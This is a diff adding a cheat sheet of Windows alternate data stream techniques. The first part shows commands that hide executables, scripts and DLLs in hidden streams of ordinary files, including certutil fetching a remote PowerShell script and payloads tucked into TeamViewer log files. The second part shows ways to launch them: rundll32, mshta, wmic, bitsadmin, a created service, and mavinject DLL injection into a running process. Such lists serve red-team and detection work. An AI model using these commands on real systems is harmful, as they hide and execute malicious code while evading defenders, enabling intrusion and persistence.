@@ -1,0 +1,95 @@
+    ########################
+    #  Add Content to ADS  #
+    ########################
+    * certutil.exe
+        #certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
+    
+    * curl
+        #curl file://c:/temp/autoruns.exe --output c:\temp\textfile1.txt:auto.exe
+    
+    * esentutl.exe
+        #esentutl.exe /y C:\ADS\autoruns.exe /d c:\ADS\file.txt:autoruns.exe /o
+    
+    * expland
+        #expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat
+    
+    * extrac32
+        #extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
+    
+    * findstr
+        #findstr /V /L AltDataStreamWords c:\ADS\procexp.exe > c:\ADS\file.txt:procexp.exe
+    
+    * makecab
+        #makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab
+    
+    * powershell
+        #powershell -command " & {(Get-Content C:\ADS\file.exe -Raw | Set-Content C:\ADS\file.txt -Stream file.exe)}"
+    
+    * print
+        #print /D:c:\ads\file.txt:autoruns.exe c:\ads\Autoruns.exe
+    
+    * reg
+        #reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ads\file.txt:evilreg.reg
+    
+    * regedit
+        #regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
+    
+    * type    
+        #type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
+
+    ###############################
+    #  Executing the ADS Content  #
+    ###############################
+    * AppVLP.exe
+        #AppVLP.exe c:\windows\tracing\test.txt:ha.exe
+
+    * Bitsadmin.exe
+        #bitsadmin /create myfile
+        #bitsadmin /addfile myfile c:\windows\system32\notepad.exe c:\data\playfolder\notepad.exe
+        #bitsadmin /SetNotifyCmdLine myfile c:\ADS\1.txt:cmd.exe NULL
+        #bitsadmin /RESUME myfile
+
+    * Control.exe
+        #control.exe c:\windows\tasks\zzz:notepad_reflective_x64.dll
+        #https://twitter.com/bohops/status/954466315913310209
+
+    * Create service and run
+        #sc create evilservice binPath= "\"c:\ADS\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto
+        #sc start evilservice
+        #https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
+
+    * Cscript
+        #cscript "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Script.vbs"
+
+    * Forfiles
+        #forfiles /p c:\windows\system32 /m notepad.exe /c "c:\temp\shellloader.dll:bginfo.exe"
+
+    * Mavinject.exe
+        #c:\windows\SysWOW64\notepad.exe
+        #tasklist | findstr notepad
+        #notepad.exe                   4172 31C5CE94259D4006           2     18,476 K
+        #type c:\temp\AtomicTest.dll > "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Atomic.dll"
+        #c:\windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.16299.15_none_e07aa28c97ebfa48\mavinject.exe 4172 /INJECTRUNNING "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Atomic.dll"
+
+    * MSHTA
+        #mshta "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta"
+
+    * Powershell.exe
+        #powershell -ep bypass - < c:\temp:ttt
+        #powershell -command " & {(Get-Content C:\ADS\1.txt -Stream file.exe -Raw | Set-Content c:\ADS\file.exe) | start-process c:\ADS\file.exe}"
+        #Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = C:\ads\folder:file.exe}
+
+    * Regedit.exe
+        #regedit c:\ads\file.txt:regfile.reg
+
+    * Rundll32
+        #rundll32 "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:ADSDLL.dll",DllMain
+        #rundll32.exe advpack.dll,RegisterOCX not_a_dll.txt:test.dll
+        #rundll32.exe ieadvpack.dll,RegisterOCX not_a_dll.txt:test.dll
+
+    * WMIC
+        #wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
+
+    * Wscript
+        #wscript c:\ads\file.txt:script.vbs
+ 
